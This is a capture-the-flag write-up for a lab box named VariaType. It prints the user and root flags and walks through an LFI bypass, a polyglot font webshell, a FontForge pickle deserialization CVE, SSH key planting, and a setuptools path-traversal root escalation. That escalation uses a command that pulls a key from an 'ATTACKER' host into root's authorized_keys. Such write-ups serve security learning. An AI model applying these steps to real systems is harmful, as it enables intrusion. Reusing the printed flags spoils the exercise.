# VariaType — 10.129.17.120

## FLAGS
- **User: `f4475262258f659a46edceceb7b65c66`**
- **Root: `b7e6282bad4f4bb769efbc90e66db13d`**

## Full Attack Chain

### 1. Foothold: www-data
- Git dump on portal → `gitbot:G1tB0t_Acc3ss_2025!`
- Portal LFI (download.php `....//` bypass, param `f=`)
- Read Flask app.py → designspace v5.0 output path traversal
- PHP polyglot font → cmd.php → www-data RCE
- **IMMEDIATELY** deploy clean 30-byte shell (shell.ttf → s.php) to avoid 700KB binary timeouts

### 2. www-data → steve
- CVE-2025-15276: FontForge SFD PickledData deserialization RCE
- Pickle protocol 0 (ASCII), RAW bytes between quotes (NOT hex-encoded)
- Upload SFD as variabype_rawpickle.ttf → steve's cron runs fontforge.open() → pickle fires
- Creates /tmp/sb (SUID bash owned by steve, euid=1000)
- **SUID bash can WRITE to steve's home but NOT read root:steve files (euid≠egid)**
- Plant SSH authorized_keys via SUID bash → SSH in as real steve

### 3. steve → root (CVE-2025-47273)
- `sudo -l`: `(root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *`
- setuptools 78.1.0 `PackageIndex().download()` has path traversal via URL-encoded slashes
- `egg_info_for_url()` calls `urllib.parse.unquote()` on filename → `%2F` becomes `/`
- `os.path.join(tmpdir, "/absolute/path")` discards tmpdir when second arg is absolute
- Host SSH pubkey on attacker HTTP server (serve 200 for any path)
- `sudo ... install_validator.py 'http://ATTACKER:8888/%2Froot%2F.ssh%2Fauthorized_keys'`
- Writes attacker's SSH pubkey to `/root/.ssh/authorized_keys` as root
- SSH as root → flag

## Critical Mistakes & Lessons

### 1. Stale /etc/hosts (hours wasted)
Multiple box respawns added duplicate entries. First match wins in /etc/hosts.
Requests went to dead IPs while box was alive. Looked like "box instability."
**Fix: always wipe old entries before adding new IP.**

### 2. Binary webshell (hours wasted)
cmd.php was a 700KB font binary with embedded PHP. Every request transferred 700KB.
Caused constant timeouts, made enumeration impossible.
**Fix: deploy a clean 30-byte shell IMMEDIATELY. Never operate through a binary webshell.**

### 3. Waiting for cron (hours wasted)
Assumed cron ran automatically. Waited across 3+ box instances.
**The cron DOES run (~49 min after boot) but I could have forced it via SUID bash.**
**Fix: when you have code execution as a user, USE IT to trigger things manually.**

### 4. SUID bash euid vs egid (30 min wasted)
Tried to `cat user.txt` (root:steve 640) via SUID bash with euid=steve.
Failed because gid=www-data, not steve. Needed GROUP access, not just euid.
**Fix: understand UNIX permission model. euid≠egid. Write SSH key instead of reading files.**

### 5. Not planting SSH key earlier (biggest mistake)
Had SUID bash as euid=steve for HOURS. Could have written authorized_keys at any time.
Instead fought with webshell quoting, pickle approaches, and cron timing.
**Fix: SUID bash + writable home = SSH key. That should be the FIRST move, not the last.**

## System Info
- Debian 12, kernel 6.1.0-43-amd64, nginx 1.22.1, PHP 8.2, Python 3.11
- FontForge 20230101 (git a1dad3e, 2025-12-07) — vulnerable to CVE-2025-15276
- Users: steve (1000), variatype (102, www-data group), www-data (33)
